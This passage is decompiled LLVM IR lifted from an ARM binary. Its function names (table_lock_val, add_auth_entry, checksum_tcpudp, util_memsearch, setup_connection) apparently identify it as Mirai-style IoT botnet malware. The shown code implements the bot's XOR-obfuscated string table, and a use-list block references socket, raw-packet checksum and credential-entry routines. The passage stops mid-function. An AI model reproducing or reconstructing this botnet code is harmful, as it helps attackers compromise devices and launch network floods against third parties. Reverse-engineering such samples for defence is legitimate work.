  uselistorder i32* %r0.global-to-local, { 80, 79, 82, 81, 83, 84, 85, 87, 86, 88, 89, 90, 120, 92, 91, 93, 95, 94, 96, 97, 98, 100, 99, 4, 124, 121, 122, 123, 0, 126, 125, 18, 20, 19, 21, 24, 22, 103, 130, 215, 217, 216, 101, 102, 104, 105, 107, 106, 108, 110, 109, 111, 23, 25, 27, 26, 1, 2, 5, 3, 7, 9, 11, 10, 8, 6, 13, 12, 14, 15, 16, 17, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 41, 40, 43, 42, 45, 44, 46, 47, 49, 48, 51, 50, 53, 52, 54, 55, 57, 56, 59, 58, 61, 60, 62, 63, 65, 64, 67, 66, 69, 68, 70, 71, 73, 72, 75, 74, 77, 76, 78, 113, 115, 114, 116, 112, 117, 118, 119, 127, 128, 129, 133, 131, 132, 138, 134, 135, 219, 136, 137, 139, 141, 140, 142, 147, 143, 146, 144, 145, 148, 150, 151, 149, 154, 152, 153, 157, 155, 156, 159, 158, 220, 218, 161, 160, 162, 164, 163, 166, 165, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 204, 203, 205, 210, 206, 207, 208, 209, 211, 212, 213, 214 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 126, 107, 108, 121, 122, 127, 128, 140, 215, 216, 30, 31, 33, 109, 217, 111, 113, 114, 214, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 218, 112, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 32, 110, 34, 40, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 50, 51, 52, 47, 48, 49, 53, 54, 55, 56, 57, 58, 62, 63, 64, 59, 60, 61, 65, 66, 67, 68, 69, 70, 74, 75, 76, 71, 72, 73, 77, 78, 79, 80, 81, 82, 86, 87, 88, 83, 84, 85, 89, 90, 91, 92, 93, 94, 98, 99, 100, 95, 96, 97, 101, 102, 103, 104, 105, 106, 115, 116, 117, 118, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 220, 219, 141, 142, 143, 144, 146, 145, 147, 148, 149, 152, 154, 155, 153, 150, 151, 123, 124, 119, 156, 120, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 213, 189, 190, 191, 192, 193, 212, 194, 195, 196, 211, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 125, 210 }
  uselistorder i1* %cpsr_c.global-to-local, { 122, 104, 105, 123, 117, 118, 124, 136, 114, 208, 27, 28, 30, 106, 209, 107, 109, 110, 207, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 211, 108, 15, 16, 21, 17, 18, 19, 20, 22, 23, 24, 25, 26, 29, 210, 31, 37, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 47, 48, 49, 44, 45, 46, 50, 51, 52, 53, 54, 55, 59, 60, 61, 56, 57, 58, 62, 63, 64, 65, 66, 67, 71, 72, 73, 68, 69, 70, 74, 75, 76, 77, 78, 79, 83, 84, 85, 80, 81, 82, 86, 87, 88, 89, 90, 91, 95, 96, 97, 92, 93, 94, 98, 99, 100, 101, 102, 103, 111, 112, 113, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 212, 213, 137, 138, 139, 140, 141, 142, 143, 146, 148, 149, 147, 144, 145, 119, 120, 115, 150, 116, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 206, 181, 182, 183, 184, 185, 205, 186, 187, 188, 204, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 121, 203 }
  uselistorder i32 ptrtoint (i16** @global_var_260c0.116 to i32), { 4, 0, 1, 3, 2 }
  uselistorder i16** @global_var_235ec.171, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_235ec.171 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3, 6 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 13, 12, 11, 10, 9, 8, 7, 1, 25, 24, 28, 27, 26, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 2, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i32)* @table_lock_val, { 27, 36, 35, 26, 37, 34, 33, 32, 31, 30, 29, 28, 25, 7, 6, 5, 4, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 24, 23, 22, 21, 20, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 23, 21, 24, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 33, 34, 35, 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 11, 12, 13, 14, 15, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 (i32)* @table_unlock_val, { 38, 37, 46, 45, 44, 43, 42, 41, 40, 39, 36, 19, 18, 17, 16, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 35, 34, 33, 32, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10 }
  uselistorder i8 2, { 0, 3, 2, 1 }
  uselistorder i8 5, { 12, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 11, 13, 10 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 54, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1a844.224 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7fc.208 to i32), { 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 6, 26, 7, 27, 8, 28, 9, 29, 10, 30, 11, 31, 12, 32, 13, 33, 14, 34, 15, 35, 16, 36, 17, 37, 18, 38, 19, 39 }
  uselistorder i32 ptrtoint (i32* @global_var_1a794.202 to i32), { 0, 6, 1, 7, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7e8.200 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1a7dc.198 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1a7c4.194 to i32), { 0, 9, 1, 10, 2, 11, 3, 4, 5, 12, 6, 13, 7, 14, 8, 15 }
  uselistorder i8* @global_var_235e1.189, { 1, 0 }
  uselistorder i16* @global_var_235d6.188, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 0, 2, 1, 3 }
  uselistorder i8 6, { 4, 5, 6, 7, 8, 9, 3, 10, 0, 11, 1, 2 }
  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_235d4.183 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_235e0.184, { 1, 0 }
  uselistorder i8** @global_var_235c0.180, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_235c0.180 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @rand_next, { 66, 65, 64, 63, 62, 61, 60, 3, 2, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @global_var_260d4.178, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_260d0.176, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_235f0.165, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_260b8.92, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_260b8.92 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_260d8.163, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10db4, { 1, 0 }
  uselistorder label %bb428, { 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0 }
  uselistorder label %dec_label_pc_10004.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004.backedge.thread528, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10004.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10aac, { 1, 0 }
  uselistorder label %dec_label_pc_109e4, { 1, 0 }
  uselistorder label %dec_label_pc_109e0, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_109d8, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_109c8, { 1, 0 }
  uselistorder label %dec_label_pc_10958, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10924, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10904, { 1, 0 }
  uselistorder label %dec_label_pc_108f0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_108ac, { 1, 0 }
  uselistorder label %dec_label_pc_108ac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1088c, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_10858, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_10808, { 1, 0 }
  uselistorder label %dec_label_pc_10720, { 1, 0 }
  uselistorder label %dec_label_pc_10654, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
  uselistorder label %dec_label_pc_104c0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_104a8, { 1, 0 }
  uselistorder label %dec_label_pc_103ec, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_103d4, { 1, 0 }
  uselistorder label %dec_label_pc_10318, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10300, { 1, 0 }
  uselistorder label %dec_label_pc_10244, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1022c, { 1, 0 }
  uselistorder label %dec_label_pc_1010c, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb390, { 1, 0 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %dec_label_pc_100d0, { 1, 0 }
  uselistorder label %dec_label_pc_10068, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_1001c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
  uselistorder label %dec_label_pc_ff3c, { 1, 0 }
  uselistorder label %bb384, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_fe30.dec_label_pc_fe30_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe10.dec_label_pc_fe10_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe04, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fdfc, { 1, 0 }
  uselistorder label %dec_label_pc_fdd8, { 1, 0 }
  uselistorder label %dec_label_pc_fdb4, { 1, 0 }
  uselistorder label %dec_label_pc_fc68, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_fc54, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_fae0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fabc, { 1, 0 }
  uselistorder label %dec_label_pc_fab0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fa8c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fa68, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_fa14, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_f6f0, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_260e0.274 to i32), i32* @r2, align 4
  %v3_10dc0 = mul i32 %arg1, 8
  %v2_10dc4 = add i32 %v3_10dc0, ptrtoint (i32* @global_var_260e0.274 to i32)
  store i32 %v2_10dc4, i32* @r3, align 4
  %v2_10dc8 = icmp eq i32* %arg2, null
  br i1 %v2_10dc8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_10dd04 = inttoptr i32 %v2_10dc4 to i32*
  %v4_10dd05 = load i32, i32* %v3_10dd04, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_10dcc = add i32 %v3_10dc0, add (i32 ptrtoint (i32* @global_var_260e0.274 to i32), i32 4)
  %v3_10dcc = inttoptr i32 %v2_10dcc to i16*
  %v4_10dcc = load i16, i16* %v3_10dcc, align 4
  %v5_10dcc = zext i16 %v4_10dcc to i32
  store i32 %v5_10dcc, i32* @r3, align 4
  %v3_10dd0 = inttoptr i32 %v2_10dc4 to i32*
  %v4_10dd0 = load i32, i32* %v3_10dd0, align 4
  store i32 %v5_10dcc, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_10dd06 = phi i32 [ %v4_10dd05, %.thread ], [ %v4_10dd0, %bb ]
  ret i32 %v4_10dd06

; uselistorder directives
  uselistorder i32 %v2_10dc4, { 1, 0, 2 }
  uselistorder i32 %v3_10dc0, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10de8 = mul i32 %arg1, 8
  %v2_10dec = add i32 %v3_10de8, ptrtoint (i32* @global_var_260e0.274 to i32)
  %v2_10df0 = load i32, i32* @global_var_23430.277, align 4
  store i32 %v2_10df0, i32* @r1, align 4
  %v1_10df4 = add i32 %v3_10de8, add (i32 ptrtoint (i32* @global_var_260e0.274 to i32), i32 4)
  %v2_10df4 = inttoptr i32 %v1_10df4 to i16*
  %v3_10df4 = load i16, i16* %v2_10df4, align 4
  %v3_10df8 = udiv i32 %v2_10df0, 256
  store i32 %v3_10df8, i32* @r2, align 4
  %v2_10dfc = icmp eq i16 %v3_10df4, 0
  store i1 %v2_10dfc, i1* @cpsr_z, align 1
  %v3_10e00 = udiv i32 %v2_10df0, 65536
  store i32 %v3_10e00, i32* @r3, align 4
  %v3_10e04 = load i32, i32* @r4, align 4
  store i32 %v3_10e04, i32* %stack_var_-16, align 4
  %v1_10e08 = urem i32 %v3_10df8, 256
  store i32 %v1_10e08, i32* %r6.global-to-local, align 4
  %v1_10e0c = urem i32 %v3_10e00, 256
  store i32 %v1_10e0c, i32* %r5.global-to-local, align 4
  %v3_10e10 = udiv i32 %v2_10df0, 16777216
  store i32 %v3_10e10, i32* %r4.global-to-local, align 4
  %v1_10e14 = urem i32 %v2_10df0, 256
  store i32 %v1_10e14, i32* %lr.global-to-local, align 4
  br i1 %v2_10dfc, label %dec_label_pc_10e70, label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10e20 = inttoptr i32 %v2_10dec to i32*
  br label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10e20.dec_label_pc_10e20_crit_edge, %dec_label_pc_10e1c
  %v0_10e28 = phi i32 [ %v0_10e28.pre, %dec_label_pc_10e20.dec_label_pc_10e20_crit_edge ], [ %v1_10e14, %dec_label_pc_10e1c ]
  %v2_10e2c = phi i32 [ %v1_10e64, %dec_label_pc_10e20.dec_label_pc_10e20_crit_edge ], [ 0, %dec_label_pc_10e1c ]
  %v2_10e20 = load i32, i32* %v1_10e20, align 4
  %v2_10e24 = add i32 %v2_10e20, %v2_10e2c
  %v3_10e24 = inttoptr i32 %v2_10e24 to i8*
  %v4_10e24 = load i8, i8* %v3_10e24, align 1
  %v6_10e24 = zext i8 %v4_10e24 to i32
  %v2_10e28 = xor i32 %v6_10e24, %v0_10e28
  %v1_10e2c = trunc i32 %v2_10e28 to i8
  store i8 %v1_10e2c, i8* %v3_10e24, align 1
  %v2_10e30 = load i32, i32* %v1_10e20, align 4
  %v0_10e34 = load i32, i32* @ip, align 4
  %v2_10e34 = add i32 %v0_10e34, %v2_10e30
  %v3_10e34 = inttoptr i32 %v2_10e34 to i8*
  %v4_10e34 = load i8, i8* %v3_10e34, align 1
  %v6_10e34 = zext i8 %v4_10e34 to i32
  %v0_10e38 = load i32, i32* %r6.global-to-local, align 4
  %v2_10e38 = xor i32 %v0_10e38, %v6_10e34
  %v1_10e3c = trunc i32 %v2_10e38 to i8
  store i8 %v1_10e3c, i8* %v3_10e34, align 1
  %v2_10e40 = load i32, i32* %v1_10e20, align 4
  %v0_10e44 = load i32, i32* @ip, align 4
  %v2_10e44 = add i32 %v0_10e44, %v2_10e40
  %v3_10e44 = inttoptr i32 %v2_10e44 to i8*
  %v4_10e44 = load i8, i8* %v3_10e44, align 1
  %v6_10e44 = zext i8 %v4_10e44 to i32
  %v0_10e48 = load i32, i32* %r5.global-to-local, align 4
  %v2_10e48 = xor i32 %v0_10e48, %v6_10e44
  %v1_10e4c = trunc i32 %v2_10e48 to i8
  store i8 %v1_10e4c, i8* %v3_10e44, align 1
  %v2_10e50 = load i32, i32* %v1_10e20, align 4
  store i32 %v2_10e50, i32* @r1, align 4
  %v0_10e54 = load i32, i32* @ip, align 4
  %v2_10e54 = add i32 %v0_10e54, %v2_10e50
  %v3_10e54 = inttoptr i32 %v2_10e54 to i8*
  %v4_10e54 = load i8, i8* %v3_10e54, align 1
  %v6_10e54 = zext i8 %v4_10e54 to i32
  %v0_10e58 = load i32, i32* %r4.global-to-local, align 4
  %v2_10e58 = xor i32 %v0_10e58, %v6_10e54
  store i32 %v2_10e58, i32* @r3, align 4
  %v1_10e5c = trunc i32 %v2_10e58 to i8
  store i8 %v1_10e5c, i8* %v3_10e54, align 1
  %v3_10e60 = load i16, i16* %v2_10df4, align 4
  %v4_10e60 = zext i16 %v3_10e60 to i32
  store i32 %v4_10e60, i32* @r2, align 4
  %v0_10e64 = load i32, i32* @ip, align 4
  %v1_10e64 = add i32 %v0_10e64, 1
  store i32 %v1_10e64, i32* @ip, align 4
  %v9_10e68 = icmp eq i32 %v4_10e60, %v1_10e64
  store i1 %v9_10e68, i1* @cpsr_z, align 1
  %v8_10e6c = icmp sgt i32 %v4_10e60, %v1_10e64
  br i1 %v8_10e6c, label %dec_label_pc_10e20.dec_label_pc_10e20_crit_edge, label %dec_label_pc_10e70.loopexit

dec_label_pc_10e20.dec_label_pc_10e20_crit_edge:  ; preds = %dec_label_pc_10e20
  %v0_10e28.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10e20

dec_label_pc_10e70.loopexit:                      ; preds = %dec_label_pc_10e20
  %v2_10e70.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10e70

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e70.loopexit, %entry
  %v2_10e70 = phi i32 [ %v2_10e70.pre, %dec_label_pc_10e70.loopexit ], [ %v3_10e04, %entry ]
  store i32 %v2_10e70, i32* @r4, align 4
  ret i32 %v2_10dec

; uselistorder directives
  uselistorder i32 %v1_10e64, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10e14, { 1, 0 }
  uselistorder i32 %v3_10e00, { 1, 0 }
  uselistorder i32 %v3_10df8, { 1, 0 }
  uselistorder i32 %v2_10df0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_10dec, { 1, 0 }
  uselistorder i32 %v3_10de8, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10e88 = mul i32 %arg1, 8
  %v2_10e8c = add i32 %v3_10e88, ptrtoint (i32* @global_var_260e0.274 to i32)
  %v2_10e90 = load i32, i32* @global_var_23430.277, align 4
  %v3_10ea0 = udiv i32 %v2_10e90, 65536
  store i32 %v3_10ea0, i32* @r3, align 4
  ret i32 %v2_10e8c
}

define i32 @function_10ea4(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10ea4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_10ea4 = load i32, i32* @r4, align 4
  store i32 %v3_10ea4, i32* %stack_var_-16, align 4
  %v1_10ea8 = urem i32 %arg3, 256
  store i32 %v1_10ea8, i32* %r6.global-to-local, align 4
  %v1_10eac = urem i32 %arg4, 256
  store i32 %v1_10eac, i32* %r5.global-to-local, align 4
  %v3_10eb0 = udiv i32 %arg2, 16777216
  store i32 %v3_10eb0, i32* %r4.global-to-local, align 4
  %v1_10eb4 = urem i32 %arg2, 256
  store i32 %v1_10eb4, i32* %lr.global-to-local, align 4
  %v0_10eb8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10eb8, label %dec_label_pc_10f10, label %dec_label_pc_10ebc

dec_label_pc_10ebc:                               ; preds = %dec_label_pc_10ea4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_10f00 = add i32 %tmp, 4
  %v2_10f00 = inttoptr i32 %v1_10f00 to i16*
  br label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10ec0.dec_label_pc_10ec0_crit_edge, %dec_label_pc_10ebc
  %v0_10ec8 = phi i32 [ %v0_10ec8.pre, %dec_label_pc_10ec0.dec_label_pc_10ec0_crit_edge ], [ %v1_10eb4, %dec_label_pc_10ebc ]
  %v2_10ecc = phi i32 [ %v1_10f04, %dec_label_pc_10ec0.dec_label_pc_10ec0_crit_edge ], [ 0, %dec_label_pc_10ebc ]
  %v2_10ec0 = load i32, i32* %arg1, align 4
  %v2_10ec4 = add i32 %v2_10ec0, %v2_10ecc
  %v3_10ec4 = inttoptr i32 %v2_10ec4 to i8*
  %v4_10ec4 = load i8, i8* %v3_10ec4, align 1
  %v6_10ec4 = zext i8 %v4_10ec4 to i32
  %v2_10ec8 = xor i32 %v6_10ec4, %v0_10ec8
  %v1_10ecc = trunc i32 %v2_10ec8 to i8
  store i8 %v1_10ecc, i8* %v3_10ec4, align 1
  %v2_10ed0 = load i32, i32* %arg1, align 4
  %v0_10ed4 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ed4 = add i32 %v0_10ed4, %v2_10ed0
  %v3_10ed4 = inttoptr i32 %v2_10ed4 to i8*
  %v4_10ed4 = load i8, i8* %v3_10ed4, align 1
  %v6_10ed4 = zext i8 %v4_10ed4 to i32
  %v0_10ed8 = load i32, i32* %r6.global-to-local, align 4
  %v2_10ed8 = xor i32 %v0_10ed8, %v6_10ed4
  %v1_10edc = trunc i32 %v2_10ed8 to i8
  store i8 %v1_10edc, i8* %v3_10ed4, align 1
  %v2_10ee0 = load i32, i32* %arg1, align 4
  %v0_10ee4 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ee4 = add i32 %v0_10ee4, %v2_10ee0
  %v3_10ee4 = inttoptr i32 %v2_10ee4 to i8*
  %v4_10ee4 = load i8, i8* %v3_10ee4, align 1
  %v6_10ee4 = zext i8 %v4_10ee4 to i32
  %v0_10ee8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10ee8 = xor i32 %v0_10ee8, %v6_10ee4
  %v1_10eec = trunc i32 %v2_10ee8 to i8
  store i8 %v1_10eec, i8* %v3_10ee4, align 1
